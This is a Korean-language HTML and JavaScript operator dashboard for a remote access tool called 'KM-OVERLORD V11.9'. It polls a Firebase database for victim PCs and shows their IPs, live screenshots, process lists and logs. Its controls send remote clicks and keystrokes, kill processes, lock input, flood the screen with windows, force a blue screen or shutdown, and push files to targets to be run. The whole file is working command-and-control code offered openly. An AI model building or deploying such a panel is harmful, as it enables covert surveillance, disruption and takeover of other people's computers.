<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>KM-OVERLORD V11.9 : MASTER CONTROL</title>
    <style>
        /* [디자인 시스템 - v6.5 스타일 계승] */
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
        h1 { text-align: center; text-shadow: 0 0 10px #0f0; letter-spacing: 3px; border-bottom: 1px solid #0f0; padding-bottom: 10px; }
        
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
        .pc-card { border: 2px solid #0f0; background: #111; padding: 15px; cursor: pointer; border-radius: 5px; transition: 0.3s; }
        .pc-card:hover { box-shadow: 0 0 20px #0f0; transform: translateY(-5px); }
        .pc-card.offline { border-color: #444; color: #444; }
        .screen-img { width: 100%; border: 1px solid #333; margin-top: 10px; background: #050505; }

        /* [제어 모달 시스템] */
        #modal { display:none; position:fixed; top:2%; left:2%; width:96%; height:92%; background: rgba(5, 5, 5, 0.98); border: 3px solid #0f0; z-index: 100; padding: 20px; box-shadow: 0 0 100px #000; overflow-y: auto; }
        .control-panel { display: flex; gap: 20px; flex-wrap: wrap; }
        .side-panel { flex: 1; min-width: 320px; background: #151515; padding: 15px; border-radius: 10px; border: 1px solid #333; }
        
        input, select, button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 5px 0; width: 100%; box-sizing: border-box; font-family: inherit; }
        button:hover { background: #0f0; color: #000; cursor: pointer; font-weight: bold; }
        
        /* [위험 구역 - 레드 테마] */
        .bomber-zone { border: 2px solid #f00; padding: 15px; margin-top: 15px; border-radius: 5px; background: rgba(50, 0, 0, 0.2); }
        .danger-btn { border-color: #f00; color: #f00; }
        .danger-btn:hover { background: #f00; color: #fff; }
        
        .close-btn { color: #f00; float: right; cursor: pointer; font-size: 40px; line-height: 30px; }
        .drop-zone { border: 2px dashed #0f0; padding: 20px; text-align: center; margin-top: 10px; font-size: 13px; color: #888; }
        
        /* 로그 박스 */
        .log-box { height: 350px; background: #000; border: 1px solid #0f0; overflow-y: scroll; padding: 10px; font-size: 12px; color: #0f0; line-height: 1.6; }
    </style>
</head>
<body>

    <h1>[ KM-OVERLORD V11.9 FINAL DASHBOARD ]</h1>
    <div id="pc-grid" class="grid"></div>

    <div id="modal">
        <span class="close-btn" onclick="closeModal()">&times;</span>
        <h2 id="modal-title" style="color:#fff;">TARGET: NONE</h2>
        
        <div class="control-panel">
            <div style="flex: 2; min-width: 450px;">
                <img id="modal-screen" style="width:100%; border:1px solid #0f0; cursor:crosshair;" onclick="handleRemoteClick(event)" title="원격 클릭">
                
                <div style="display:grid; grid-template-columns: 1fr 1fr 1fr; gap:10px; margin-top:15px;">
                    <button onclick="sendCmd('mon_off')">🌙 모니터 끄기</button>
                    <button onclick="sendCmd('url', prompt('URL 입력:'))">🌐 URL 열기</button>
                    <button onclick="sendCmd('msg', prompt('메시지 내용:'))">💬 메시지 전송</button>
                    <button onclick="sendCmd('key', 'f12')">📸 F12 전송</button>
                    <button onclick="sendCmd('hotkey', 'alt,f4')">🚪 Alt+F4 종료</button>
                    <button onclick="sendCmd('key', 'enter')">⏎ Enter 입력</button>
                </div>

                <div class="bomber-zone">
                    <label style="color:#f00; font-weight:bold; display:block; margin-bottom:10px;">☣️ ATTACK & CONTROL (v11.9 파괴 시스템)</label>
                    <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
                        <button class="danger-btn" onclick="const s = prompt('봉쇄 시간(초):', '15'); if(s) sendCmd('lock_input', s)">🔒 마우스 봉쇄</button>
                        <button class="danger-btn" onclick="sendCmd('bomb')">💣 창 폭탄(50개)</button>
                    </div>
                    <div style="display:grid; grid-template-columns: 1fr 1fr 1fr; gap:10px; margin-top:10px;">
                        <button class="danger-btn" onclick="const sec = prompt('종료 예약(초):', '60'); if(sec) sendCmd('shutdown_timer', sec)">⏰ 예약 종료</button>
                        <button onclick="sendCmd('shutdown_cancel')" style="border-color:#0ff; color:#0ff;">🚫 종료 취소</button>
                        <button class="danger-btn" onclick="if(confirm('진짜 블루스크린을 실행하시겠습니까?')) sendCmd('bsod')">💀 리얼 BSOD</button>
                    </div>
                    <button class="danger-btn" style="margin-top:10px;" onclick="if(confirm('대상 PC를 즉시 종료하시겠습니까?')) sendCmd('shutdown_now')">🔌 즉시 시스템 종료</button>
                </div>
            </div>

            <div class="side-panel">
                <label>🏷️ PC 별명</label>
                <div style="display:flex; gap:5px;"><input type="text" id="nick-input"><button style="width:70px;" onclick="saveNickname()">변경</button></div>

                <label style="margin-top:10px; display:block;">⌨️ 원격 타이핑</label>
                <div style="display:flex; gap:5px;"><input type="text" id="type-input"><button style="width:70px;" onclick="sendType()">전송</button></div>

                <label style="margin-top:10px; display:block;">🚀 프로세스 목록</label>
                <select id="proc-list" size="5"></select>
                <button class="danger-btn" onclick="killSelected()">선택 프로세스 종료</button>
                
                <div class="log-container" style="margin-top:15px;">
                    <label>📝 실시간 시스템 로그</label>
                    <div id="log-box" class="log-box"></div>
                    <div style="display: flex; gap: 5px; margin-top: 10px;">
                        <button onclick="downloadLogs()">💾 로그 다운</button>
                        <button onclick="sendCmd('log_clear')" class="danger-btn">🧹 로그 초기화</button>
                    </div>
                </div>

                <div id="drop-zone" class="drop-zone">이곳에 파일을 드롭하여 전송/실행</div>
            </div>
        </div>
    </div>

    <script>
        const BASE_URL = "https://prank-e1fd9-default-rtdb.firebaseio.com/";
        let currentPC = "", nicknames = {}, activeLogs = [];

        async function updateData() {
            try {
                const nRes = await fetch(BASE_URL + "nicknames.json");
                nicknames = await nRes.json() || {};
                const pRes = await fetch(BASE_URL + "pcs.json");
                const pData = await pRes.json();
                renderGrid(pData);
            } catch (e) {}
        }

        function renderGrid(data) {
            const grid = document.getElementById('pc-grid');
            grid.innerHTML = '';
            if (!data) return;
            for (let id in data) {
                const pc = data[id];
                const isOnline = (Date.now()/1000 - pc.last_seen) < 15;
                const card = document.createElement('div');
                card.className = `pc-card ${isOnline ? '' : 'offline'}`;
                card.onclick = () => openModal(id, pc);
                card.innerHTML = `
                    <div style="font-weight:bold; color:#fff;">${nicknames[id] || id}</div>
                    <div style="font-size:10px; color:#888;">${pc.ip || '0.0.0.0'} [${isOnline ? 'ONLINE' : 'OFFLINE'}]</div>
                    <img src="data:image/jpeg;base64,${pc.screen_img}" class="screen-img">
                `;
                grid.appendChild(card);
                
                if (currentPC === id) {
                    document.getElementById('modal-screen').src = "data:image/jpeg;base64," + pc.screen_img;
                    updateProcList(pc.procs);
                    if(pc.logs) {
                        activeLogs = pc.logs;
                        const logBox = document.getElementById('log-box');
                        logBox.innerHTML = pc.logs.join("<br>");
                        logBox.scrollTop = logBox.scrollHeight;
                    }
                }
            }
        }

        function updateProcList(procs) {
            const list = document.getElementById('proc-list');
            const curVal = list.value;
            list.innerHTML = '';
            if (procs) {
                procs.forEach(p => {
                    const opt = document.createElement('option');
                    opt.value = opt.innerText = p;
                    list.appendChild(opt);
                });
            }
            list.value = curVal;
        }

        function openModal(id, pc) {
            currentPC = id;
            document.getElementById('modal').style.display = "block";
            document.getElementById('modal-title').innerText = "TARGET: " + (nicknames[id] || id);
            document.getElementById('nick-input').value = nicknames[id] || "";
        }

        function closeModal() { document.getElementById('modal').style.display = "none"; currentPC = ""; }

        async function sendCmd(cmd, val = "") {
            if (!currentPC || val === null) return;
            await fetch(`${BASE_URL}pcs/${currentPC}.json`, {
                method: 'PATCH',
                body: JSON.stringify({ "cmd": cmd, "val": val, "is_new": true })
            });
        }

        function handleRemoteClick(event) {
            const img = event.target;
            const x = Math.round((event.offsetX / img.clientWidth) * 1920);
            const y = Math.round((event.offsetY / img.clientHeight) * 1080);
            sendCmd('click', `${x},${y}`);
        }

        function sendType() {
            const el = document.getElementById('type-input');
            sendCmd('type', el.value);
            el.value = '';
        }

        function killSelected() {
            const val = document.getElementById('proc-list').value;
            if (val) sendCmd('kill', val);
        }

        async function saveNickname() {
            const nick = document.getElementById('nick-input').value;
            await fetch(`${BASE_URL}nicknames/${currentPC}.json`, { method: 'PUT', body: JSON.stringify(nick) });
            updateData();
        }

        const dz = document.getElementById('drop-zone');
        dz.ondragover = (e) => { e.preventDefault(); dz.style.borderColor = "#fff"; };
        dz.ondragleave = () => { dz.style.borderColor = "#0f0"; };
        dz.ondrop = (e) => {
            e.preventDefault();
            const file = e.dataTransfer.files[0];
            const reader = new FileReader();
            reader.onload = async (ev) => {
                const b64 = ev.target.result.split(',')[1];
                await fetch(`${BASE_URL}pcs/${currentPC}.json`, {
                    method: 'PATCH',
                    body: JSON.stringify({ "file_data": b64, "file_name": file.name, "file_is_new": true })
                });
                alert("파일 전송 완료: " + file.name);
            };
            reader.readAsDataURL(file);
        };

        setInterval(updateData, 3000);
        updateData();
    </script>
</body>
</html>
